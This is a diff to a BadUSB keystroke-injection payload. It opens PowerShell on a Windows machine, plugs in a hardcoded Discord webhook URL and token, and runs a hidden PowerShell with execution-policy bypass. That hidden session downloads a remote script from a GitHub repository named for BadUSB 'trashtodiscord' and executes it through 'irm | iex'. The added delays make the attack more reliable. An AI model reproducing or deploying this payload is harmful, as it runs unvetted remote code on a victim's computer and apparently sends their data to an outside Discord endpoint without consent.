@@ -1,7 +1,9 @@
 GUI r
+DELAY 500
 STRING powershell
 ENTER
-STRING $webhook = "YOUR_WEBHOOK_HERE"
+DELAY 500
+STRING $webhook = "https://discord.com/api/webhooks/1265940140166217769/SzUc58Be89ixXfCkyYTgh91k9kXRXKLRL5T5CK7Wn_64G0W90y35u88BELKJgOFVd7yr"
 ENTER
-STRING  powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://raw.githubusercontent.com/quazi00/BAD_USB/main/trashtodiscord/SCRIPT.ps1 | iex
+STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://raw.githubusercontent.com/quazi00/BAD_USB/main/trashtodiscord/SCRIPT.ps1 | iex
 ENTER
